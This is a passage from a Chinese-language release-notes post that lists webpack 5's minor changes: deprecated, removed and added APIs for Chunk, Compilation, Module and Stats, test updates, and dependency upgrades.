`fileDependencies.add`。\n- `stats.assetsByChunkName[x]` 始终为一个数组\n- 增加了 `__webpack_get_script_filename__` 函数用于获取 script 文件的文件名。\n- 在 package.json 中 `\"sideEffects\"` 将使用 `glob-to-regex` 来代替 `micromatch` 处理。\n    - 这可能会改变边缘案例的语义。\n- 从 `IgnorePlugin` 中移除了 `checkContext`\n- 全新的 `__webpack_exports_info__` API 允许导出使用自省。\n- SourceMapDevToolPlugin 现已适用于非 chunk 资源。\n- 当引用的 env 变量缺失且没有降级数据时，EnvironmentPlugin 目前会展示一个错。\n- 从 schema 中移除 `serve` 熟悉。\n\n## 其他微小改动 \n\n- 移除 build 目录，用运行时代替 build\n- 移除不适用的特性\n    - BannerPlugin 目前只支持一个参数，这个参数可以是对象，字符串或函数\n- 移除 `CachePlugin`\n- `Chunk.entryModule` 已弃用，使用 ChunkGraph 代替\n- `Chunk.hasEntryModule` 已弃用\n- `Chunk.addModule` 已弃用\n- `Chunk.removeModule` 已弃用\n- `Chunk.getNumberOfModules` 已弃用\n- `Chunk.modulesIterable` 已弃用\n- `Chunk.compareTo` 已弃用\n- `Chunk.containsModule` 已弃用\n- `Chunk.getModules` 已弃用\n- `Chunk.remove` 已弃用\n- `Chunk.moveModule` 已弃用\n- `Chunk.integrate` 已弃用\n- `Chunk.canBeIntegrated` 已弃用\n- `Chunk.isEmpty` 已弃用\n- `Chunk.modulesSize` 已弃用\n- `Chunk.size` 已弃用\n- `Chunk.integratedSize` 已弃用\n- `Chunk.getChunkModuleMaps` 已弃用\n- `Chunk.hasModuleInGraph` 已弃用\n- `Chunk.updateHash` 签名已变更\n- `Chunk.getChildIdsByOrders` 签名已变更（TODO: 考虑移至 `ChunkGraph`）\n- `Chunk.getChildIdsByOrdersMap` 签名已变更（TODO: 考虑移至 `ChunkGraph`）\n- 移除了 `Chunk.getChunkModuleMaps`\n- 移除了 `Chunk.setModules`\n- 移除了废弃的 Chunk 方法\n- 添加了 `ChunkGraph`\n- 移除了 `ChunkGroup.setParents`\n- 移除了 `ChunkGroup.containsModule`\n- `ChunkGroup.remove` 不再断开该 Group 与 block 的连接\n- `ChunkGroup.compareTo` 签名已变更\n- `ChunkGroup.getChildrenByOrders` 签名已变更\n- `ChunkGroup` 的 index 和 index 改名为 pre/post order index\n    - 废弃了 old getter\n- `ChunkTemplate.hooks.modules` 签名已变更\n- `ChunkTemplate.hooks.render` 签名已变更\n- `ChunkTemplate.updateHashForChunk` 签名已变更\n- 移除了 `Compilation.hooks.optimizeChunkOrder`\n- 移除了 `Compilation.hooks.optimizeModuleOrder`\n- 移除了 `Compilation.hooks.advancedOptimizeModuleOrder`\n- 移除了 `Compilation.hooks.optimizeDependenciesBasic`\n- 移除了 `Compilation.hooks.optimizeDependenciesAdvanced`\n- 移除了 `Compilation.hooks.optimizeModulesBasic`\n- 移除了 `Compilation.hooks.optimizeModulesAdvanced`\n- 移除了 `Compilation.hooks.optimizeChunksBasic`\n- 移除了 `Compilation.hooks.optimizeChunksAdvanced`\n- 移除了 `Compilation.hooks.optimizeChunkModulesBasic`\n- 移除了 `Compilation.hooks.optimizeChunkModulesAdvanced`\n- 移除了 `Compilation.hooks.optimizeExtractedChunksBasic`\n- 移除了 `Compilation.hooks.optimizeExtractedChunks`\n- 移除了 `Compilation.hooks.optimizeExtractedChunksAdvanced`\n- 移除了 `Compilation.hooks.afterOptimizeExtractedChunks`\n- 添加了 `Compilation.hooks.stillValidModule`\n- 添加了 `Compilation.hooks.statsPreset`\n- 添加了 `Compilation.hooks.statsNormalize`\n- 添加了 `Compilation.hooks.statsFactory`\n- 添加了 `Compilation.hooks.statsPrinter`\n- `Compilation.fileDependencies`，`Compilation.contextDependencies` 以及 `Compilation.missingDependencies` 现在变为了 LazySets\n- 移除了 `Compilation.entries`\n    - 迁移：使用 `Compilation.entryDependencies` 代替\n- 移除了 `Compilation._preparedEntrypoints`\n- `dependencyTemplates` 现已改为 `DependencyTemplates` 的 class 类型，而不再是原始的 `Map`\n- 移除了 `Compilation.fileTimestamps` 和 `contextTimestamps`\n    - 迁移：使用 `Compilation.fileSystemInfo` 代替\n- 移除了 `Compilation.waitForBuildingFinished`\n    - 迁移：使用新队列\n- 移除了 `Compilation.addModuleDependencies`\n- 移除了 `Compilation.prefetch`\n- `Compilation.hooks.beforeHash` 会在创建模块 hash 值后被调用。\n    - 迁移：使用 `Compiliation.hooks.beforeModuleHash` 代替\n- 移除了 `Compilation.applyModuleIds`\n- 移除了 `Compilation.applyChunkIds`\n- 添加了 `Compiler.root`，用于指向根编译器\n    - 可用于缓存 WeakMaps 中的数据，而非静态作用域内的数据\n- 添加了 `Compiler.hooks.afterDone`\n- `Source.emitted` 不再由编译器设置\n    - 迁移：使用 `Compilation.emittedAssets` 代替\n- 添加了 `Compiler/Compilation.compilerPath`：此为编译器在编译器树中唯一名称。（在根编译器范围内唯一）\n- `Module.needRebuild` 已弃用\n    - 迁移：使用 `Module.needBuild` 代替\n- `Dependency.getReference` 签名已变更\n- `Dependency.getExports` 签名已变更\n- `Dependency.getWarnings` 签名已变更\n- `Dependency.getErrors` 签名已变更\n- `Dependency.updateHash` 签名已变更\n- 移除了 `Dependency.module`\n- 添加了 `DependencyTemplate` 的基类\n- 移除了 `MultiEntryDependency`\n- 添加了 `EntryDependency`\n- 移除了 `EntryModuleNotFoundError`\n- 移除了 `SingleEntryPlugin`\n- 添加了 `EntryPlugin`\n- 添加了 `Generator.getTypes`\n- 添加了 `Generator.getSize`\n- `Generator.generate` 签名已变更\n- 添加了 `HotModuleReplacementPlugin.getParserHooks`\n- `Parser` 被移至 `JavascriptParser` 中\n- `ParserHelpers` 被移至 `JavascriptParserHelpers` 中\n- 移除了 `MainTemplate.hooks.moduleObj`\n- 移除了 `MainTemplate.hooks.currentHash`\n- 移除了 `MainTemplate.hooks.addModule`\n- 移除了 `MainTemplate.hooks.requireEnsure`\n- 移除了 `MainTemplate.hooks.globalHashPaths`\n- 移除了 `MainTemplate.hooks.globalHash`\n- 移除了 `MainTemplate.hooks.hotBootstrap`\n- `MainTemplate.hooks` 部分签名已变更\n- `Module.hash` 已弃用\n- `Module.renderedHash` 已弃用\n- 移除了 `Module.reasons`\n- `Module.id` 已弃用\n- `Module.index` 已弃用\n- `Module.index2` 已弃用\n- `Module.depth` 已弃用\n- `Module.issuer` 已弃用\n- 移除了 `Module.profile`\n- 移除了 `Module.prefetched`\n- 移除了 `Module.built`\n- 移除了 `Module.used`\n    - 迁移：使用 `Module.getUsedExports` 代替\n- Module.usedExports 已弃用\n    - MIGRATION: 使用 `Module.getUsedExports` 代替\n- `Module.optimizationBailout` 已弃用\n- 移除了 `Module.exportsArgument`\n- `Module.optional` 已弃用\n- 移除了 `Module.disconnect`\n- 移除了 `Module.unseal`\n- 移除了 `Module.setChunks`\n- `Module.addChunk` 已弃用\n- `Module.removeChunk` 已弃用\n- `Module.isInChunk` 已弃用\n- `Module.isEntryModule` 已弃用\n- `Module.getChunks` 已弃用\n- `Module.getNumberOfChunks` 已弃用\n- `Module.chunksIterable` 已弃用\n- 移除了 `Module.hasEqualsChunks`\n- `Module.useSourceMap` 被移至 `NormalModule`\n- 移除了 `Module.addReason`\n- 移除了 `Module.removeReason`\n- 移除了 `Module.rewriteChunkInReasons`\n- 移除了 `Module.isUsed`\n    - 迁移：使用 `isModuleUsed`，`isExportUsed` 和 `getUsedName` 代替\n- `Module.updateHash` 签名已变更\n- 移除了 `Module.sortItems`\n- 移除了 `Module.unbuild`\n    - 迁移：使用 `invalidateBuild` 代替\n- 添加了 `Module.getSourceTypes`\n- 添加了 `Module.getRuntimeRequirements`\n- `Module.size` 签名已变更\n- `ModuleFilenameHelpers.createFilename` 签名已变更\n- `ModuleProfile` 的 class 添加了许多数据\n- 移除了 `ModuleReason`\n- `ModuleTemplate.hooks` 签名已变更\n- `ModuleTemplate.render` 签名已变更\n- 移除了 `Compiler.dependencies`\n    - 迁移：使用 `MultiCompiler.setDependencies` 代替\n- 移除了 `MultiModule`\n- 移除了 `MultiModuleFactory`\n- `NormalModuleFactory.fileDependencies`，`NormalModuleFactory.contextDependencies` 和 `NormalModuleFactory.missingDependencies` 现已使用 LazySets\n- `RuntimeTemplate` 方法现已使用 `runtimeRequirements` 的参数\n- 移除了 `serve` 属性\n- 移除了 `Stats.jsonToString`\n- 移除了 `Stats.filterWarnings`\n- 移除了 `Stats.getChildOptions`\n- 移除了 `Stats` 的 helper 方法\n- `Stats.toJson` 签名已变更（参数二被移除）\n- 移除了 `ExternalModule.external`\n- 移除了 `HarmonyInitDependency`\n- `Dependency.getInitFragments` 已弃用\n    - 迁移：使用 `apply` `initFragements` 代替\n- DependencyReference 现将函数传递给模块，而非模块。\n- 移除了 `HarmonyImportSpecifierDependency.redirectedId`\n    - 迁移：使用 `setId` 代替\n- acorn 5 -> 7\n- 测试\n    - HotTestCases 现可为多个目标运行，包括 `async-node` `node` `web` `webworker`\n    - TestCases 现在可以用 `store: \"instant\"` 和 `store: \"pack\"` 来运行系统缓存。\n    - TestCases 现在也可以为指定的模块 id 运行。\n- 工具添加了 import 的排序功能（在 CI 检查）\n- 当 chunk 的名称与 id 等价时，运行时的 chunk 名称映射不再包含入口\n- 将 `resolvedModuleId` `resolvedModuleIdentifier` 和 `resolvedModule` 添加到 Stats 的 reason 中，在完成作用域提升等优化之前，这些 reason 指向模块\n- 在 Stats toString 的输出中展示 `resolvedModule`\n- loader-runner 已升级：https://github.com/webpack/loader-runner/releases/tag/v3.0.0\n- `Compilation` 中的 `file/context/missingDependencies` 因性能问题不再排序\n    - 不要依赖排序\n- webpack-sources 已升级：https://github.com/webpack/webpack-sources/releases/tag/v2.0.0-beta.0\n- 删除了对 webpack-command 的支持\n- 使用 schema-utils@2 进行模式校验\n- `Compiler.assetEmitted` 改进了参数二，增加了更多信息\n- BannerPlugin 省略了尾部的空白字符\n- 从 `LimitChunkCountPlugin` 中移除了 `minChunkSize` 选项\n- 将与 javascript 相关的文件重组到子目录中\n    - `webpack.JavascriptModulesPlugin` -> `webpack.javascript.JavascriptModulesPlugin`\n- 添加了 `Logger.getChildLogger`\n- 将 DllPlugin 中 entryOnly 选项的默认值变更为 true\n- 移除了特殊请求的简化逻辑，使用单一的相对路径作为可读模块的名称\n- 允许 webpack:// 将 SourceMaps 中的 url 改为相对于 webpack 根目录的路径\n- 添加了 API 用于生成和处理针对 webpack 配置的 CLI 参数\n- 当使用 System.js 作为 libraryTarget 时，在 System 中添加 `__system_context__` 作为上下文\n- 为 DefinePlugin 添加 bigint 的支持\n- 对基本环节添加 bigint 的支持，例如 maths\n- 移除在创建 hash 后修改编译 hash 的功能\n- 移除了 `HotModuleReplacementPlugin` 的 multiStep 模式\n- 当使用嵌套的对象或数组时，`emitAsset` 中的 `assetInfo` 将被合并\n- 当基于 `filename` 生成路径时，`[query]` 是一个有效占位符，如 asset\n- 添加了 `Compilation.deleteAsset`，用于正确删除 asset 和非公用的相关资源\n- 将 `require(\"webpack-sources\")` 暴露为 `require(\"webpack\").sources`\n- terser 5\n- 当 Webpack 作为句首时，Webpack 的 W 应该大写\n","categories":["release"],"tags":["release","Webpack","Frontend","前端"]}]